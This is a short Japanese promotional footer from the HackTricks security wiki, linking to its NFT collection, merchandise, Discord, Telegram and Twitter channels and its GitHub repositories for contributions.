- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしましょう。**

- **ハッキングのトリックを共有するには、[hacktricksのリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudのリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
